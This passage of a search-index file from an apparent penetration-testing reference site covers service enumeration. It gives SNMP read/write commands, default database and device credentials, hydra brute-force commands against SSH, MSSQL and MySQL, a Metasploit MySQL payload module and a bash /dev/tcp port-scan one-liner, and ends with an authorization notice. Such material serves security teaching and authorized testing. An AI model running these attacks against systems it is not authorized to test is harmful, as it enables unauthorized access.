available)\nsnmpset -c private -v1 target 1.3.6.1.2.1.1.4.0 s \"Attacker Contact\"\n\n# Test for dangerous write access\nsnmpset -c private -v1 target 1.3.6.1.2.1.1.4.0 s \"Test\"\n</code></pre>"},{"location":"network/snmp/#information-extraction","title":"Information Extraction","text":"<pre><code># Extract potentially sensitive data\nsnmpwalk -c public -v1 target 1.3.6.1.4.1.77.1.2.25 | grep -i admin\nsnmpwalk -c public -v1 target 1.3.6.1.2.1.25.4.2.1.2 | grep -i sql\n</code></pre>"},{"location":"resources/references/","title":"References and Resources","text":"<p>Essential resources for penetration testing and service enumeration.</p>"},{"location":"resources/references/#vulnerability-databases","title":"Vulnerability Databases","text":"<ul> <li>Exploit Database - https://www.exploit-db.com/</li> <li>CVE Database - https://cve.mitre.org/</li> <li>NVD - https://nvd.nist.gov/</li> </ul>"},{"location":"resources/references/#testing-methodologies","title":"Testing Methodologies","text":"<ul> <li>OWASP Testing Guide - https://owasp.org/www-project-web-security-testing-guide/</li> <li>PTES - Penetration Testing Execution Standard</li> <li>NIST SP 800-115 - Security Testing Guide</li> </ul>"},{"location":"resources/references/#documentation","title":"Documentation","text":"<ul> <li>MySQL - https://dev.mysql.com/doc/</li> <li>Oracle - https://docs.oracle.com/database/</li> <li>Microsoft SQL - https://docs.microsoft.com/en-us/sql/</li> </ul>"},{"location":"resources/references/#default-credentials","title":"Default Credentials","text":""},{"location":"resources/references/#database-services","title":"Database Services","text":"<pre><code>MySQL:    root / (blank), root / root\nMSSQL:    sa / (blank), sa / sa  \nOracle:   sys / change_on_install, scott / tiger\n</code></pre>"},{"location":"resources/references/#network-devices","title":"Network Devices","text":"<pre><code>SNMP:     public, private, community\nRouter:   admin / admin, cisco / cisco\n</code></pre>"},{"location":"resources/references/#common-ports","title":"Common Ports","text":"<pre><code>21    FTP       25    SMTP      80    HTTP      139   NetBIOS\n110   POP3      143   IMAP      161   SNMP      389   LDAP\n443   HTTPS     445   SMB       993   IMAPS     995   POP3S\n1433  MSSQL     1521  Oracle    2049  NFS       3306  MySQL\n3389  RDP       5432  PostgreSQL\n</code></pre>"},{"location":"resources/references/#training-resources","title":"Training Resources","text":""},{"location":"resources/references/#online-platforms","title":"Online Platforms","text":"<ul> <li>Hack The Box - https://www.hackthebox.eu/</li> <li>TryHackMe - https://tryhackme.com/</li> <li>VulnHub - https://www.vulnhub.com/</li> </ul>"},{"location":"resources/references/#certifications","title":"Certifications","text":"<ul> <li>Entry: CompTIA Security+, PenTest+, CEH</li> <li>Advanced: OSCP, GPEN</li> <li>Expert: OSEE, GXPN</li> </ul>"},{"location":"resources/references/#legal-notice","title":"Legal Notice","text":"<p>Always ensure proper authorization before testing any systems. Unauthorized access is illegal and unethical.</p>"},{"location":"resources/tools/","title":"Essential Tools","text":"<p>Quick reference for penetration testing tools used in service enumeration.</p>"},{"location":"resources/tools/#core-tools","title":"Core Tools","text":""},{"location":"resources/tools/#nmap-network-scanner","title":"Nmap - Network Scanner","text":"<pre><code># Install: apt-get install nmap\nnmap -sV -sC target          # Service detection + scripts\nnmap -p1-1000 target         # Port range scan\nnmap --script vuln target    # Vulnerability scan\n</code></pre>"},{"location":"resources/tools/#hydra-password-attacks","title":"Hydra - Password Attacks","text":"<pre><code># Install: apt-get install hydra\nhydra -L users.txt -P pass.txt service://target\nhydra -l admin -P rockyou.txt ssh://target\n</code></pre>"},{"location":"resources/tools/#metasploit-exploitation-framework","title":"Metasploit - Exploitation Framework","text":"<pre><code># Install: curl https://raw.githubusercontent.com/.../msfinstall &amp;&amp; ./msfinstall\nsearch mysql\nuse exploit/multi/mysql/mysql_udf_payload\n</code></pre>"},{"location":"resources/tools/#service-specific-tools","title":"Service-Specific Tools","text":""},{"location":"resources/tools/#database-tools","title":"Database Tools","text":"<pre><code># MySQL\nmysql -h target -u root -p\nmysql -h target -u root -e \"SHOW DATABASES;\"\n\n# MSSQL\nsqlcmd -S target -U sa -P password\nimpacket-mssqlclient sa:password@target\n\n# Oracle\nsqlplus username/password@target:1521/SID\n</code></pre>"},{"location":"resources/tools/#mail-tools","title":"Mail Tools","text":"<pre><code># SMTP enumeration\nsmtp-user-enum -M VRFY -U users.txt -t target\nswaks --to user@target --from test@test.com --server target\n\n# IMAP/POP3\ncurl -k 'imaps://target' --user user:pass\n</code></pre>"},{"location":"resources/tools/#file-service-tools","title":"File Service Tools","text":"<pre><code># SMB\nenum4linux target\nsmbclient -L //target -N\ncrackmapexec smb target\n\n# NFS\nshowmount -e target\nmount -t nfs target:/export /mnt/nfs\n</code></pre>"},{"location":"resources/tools/#network-tools","title":"Network Tools","text":"<pre><code># SNMP\nsnmpwalk -c public -v1 target\nonesixtyone -c community.txt target\nsnmp-check target\n</code></pre>"},{"location":"resources/tools/#quick-commands","title":"Quick Commands","text":""},{"location":"resources/tools/#common-port-scans","title":"Common Port Scans","text":"<pre><code># Top 1000 ports\nnmap -T4 -A target\n\n# All TCP ports\nnmap -p- target\n\n# UDP scan\nnmap -sU -p 161,162,123,69 target\n</code></pre>"},{"location":"resources/tools/#authentication-testing","title":"Authentication Testing","text":"<pre><code># Multiple services\nhydra -L users.txt -P passwords.txt protocol://target\n\n# Common protocols\nhydra -l admin -P rockyou.txt ssh://target\nhydra -l sa -P passwords.txt mssql://target\nhydra -l root -P passwords.txt mysql://target\n</code></pre>"},{"location":"resources/tools/#utility-commands","title":"Utility Commands","text":""},{"location":"resources/tools/#banner-grabbing","title":"Banner Grabbing","text":"<pre><code># Netcat\nnc target 80\nnc target 25\n\n# Telnet  \ntelnet target 25\n\n# OpenSSL\nopenssl s_client -connect target:443\n</code></pre>"},{"location":"resources/tools/#one-liners","title":"One-liners","text":"<pre><code># Bash port scan\nfor port in {1..1000}; do timeout 1 bash -c \"&lt;/dev/tcp/target/$port\" &amp;&amp; echo \"Port $port is open\"; done 2&gt;/dev/null\n\n# HTTP title\ncurl -s target | grep -o '&lt;title&gt;.*&lt;/title&gt;'\n</code></pre>"},{"location":"resources/tools/#installation","title":"Installation","text":""},{"location":"resources/tools/#kali-linux","title":"Kali Linux","text":"<pre><code>apt-get update\napt-get install -y nmap hydra enum4linux smbclient showmount onesixtyone snmp crackmapexec\n</code></pre>"},{"location":"resources/tools/#ubuntudebian","title":"Ubuntu/Debian","text":"<pre><code>apt-get update &amp;&amp; apt-get upgrade -y\napt-get install -y nmap hydra smbclient nfs-common snmp-mibs-downloader\n</code></pre>"},{"location":"resources/tools/#quick-reference","title":"Quick Reference","text":"Service Primary Tool Command Discovery nmap <code>nmap -sV target</code> SMB enum4linux <code>enum4linux target</code> SNMP snmpwalk <code>snmpwalk -c public -v1 target</code> Database mysql/sqlcmd <code>mysql -h target -u root -p</code> Mail smtp-user-enum <code>smtp-user-enum -M VRFY -U users.txt -t target</code> Auth hydra <code>hydra -L users.txt -P pass.txt service://target</code>"}]}